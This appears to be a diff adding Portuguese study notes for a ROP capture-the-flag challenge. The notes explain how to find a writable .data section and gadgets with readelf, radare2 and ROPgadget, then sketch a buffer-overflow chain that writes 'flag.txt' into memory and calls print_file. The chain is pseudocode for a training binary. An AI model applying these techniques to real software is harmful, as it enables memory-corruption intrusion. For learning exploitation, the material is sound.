@@ -1,0 +1,40 @@
+Bom temos uma função chamada print_file e ela vai receber algo no parametro, passaremos o nosso flag.txt
+Mas antes precisamos saber aonde podemos escrever a string, em qual seção
+podemos ver isso com: readelf -a <binario>
+....................: rabin2 -S <binario>
+....................: r2 <binario> ; dentro do r2: iS~w (lista os segmentos que tem permissão de escrita)
+
+Após saber o segmento que iremos usar para colocar nossa string basta coloca-la lá
+o grande desafio é achar os GADGETS devidos
+podemos usar o ROPgadget
+
+mas tem uma forma legal de achar o gadget: mov qword [r14], r15 ; ret
+usaremos o radare2:
+r2> f~useful	# procura funções que começam com useful
+tem uma função que chama loc.usefulGadgets
+r2> pd 2 @ loca.usefulGadgets
+ira analizar os 2 primeiros codigos em assembly que são:
+mov qword [r14], r15 ; ret
+
+nos podemos achar a usefulGadgets com o gdb: info functions
+
+depois vamos pegar o gadget: pop rdi ; ret
+...........................: pop r14 ; pop r15 ; ret
+
+Com tudo isso podemos montar nosso exploit:
+A ideia é que ele mova o endereço do segmento .data para r14 e o "flag.txt" para o r15
+Depois vamos mover o endereço de r15 para o valor de r14, ou seja, vamos mover o endereço do "flag.txt" para o valor do segmento .data
+Com isso vamos chamar o pop rdi para jogar o nosso "flag.txt" para rdi e logo após chamar a função print_file
+
+Isso ficaria assim:
+xpl = b'A' * 40					# Estouro do buffer
+xpl += pop r14 ; pop r15 ; ret
+buf += .data segment			# r14 = .data segment
+buf += b'flag.txt'				# r15 = flag.txt
+
+buf += mov [r14], r15 ; ret		# mov end. do flag.txt para o valor de .data segment
+# ou seja, dentro de r14 vai ter o nosso flag.txt dentr do segmento .data
+
+buf += pop rdi ; ret
+buf += .data segment			# rdi = .data segment (que tem "flag.txt")
+buf += print_file				# print_file(rdi)
